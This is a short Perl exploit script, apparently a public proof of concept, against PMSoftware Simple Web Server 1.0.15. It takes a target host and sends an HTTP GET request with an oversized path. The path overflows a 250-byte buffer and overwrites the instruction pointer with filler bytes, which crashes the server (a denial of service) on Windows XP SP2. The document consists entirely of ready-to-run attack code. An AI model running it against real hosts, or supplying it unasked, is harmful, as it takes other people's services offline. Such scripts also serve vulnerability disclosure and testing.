
#!/usr/bin/perl
# DoS Exploit By mthumann@ernw.de
# Tested against WinXP + SP2
# Remote Buffer Overflow in PMSoftware Simple Web Server 1.0.15
# buffer[250]

use Socket;

print "PMSoftware Simple Web Server Exploit by Michael Thumann \n\n";

if (not $ARGV[0]) {
        print "Usage: swsexploit.pl <host>\n";
exit;}

$ip=$ARGV[0];

print "Sending Shellcode to: " . $ip . "\n\n";
my $testcode=
"ERNWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB".
"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC".
"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD".
"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE".
"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF".
"ABCDEFGHIJAAAA"; #EIP =41414141

my $attack="GET /".$testcode." HTTP/1.1\n" ;

$target= inet_aton($ip) || die("inet_aton problems");
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,80,$target)){
                select(S);
                $|=1;
                print $attack;
                my @in=<S>;
                select(STDOUT);
                close(S);
        } else { die("Can't connect...\n"); }

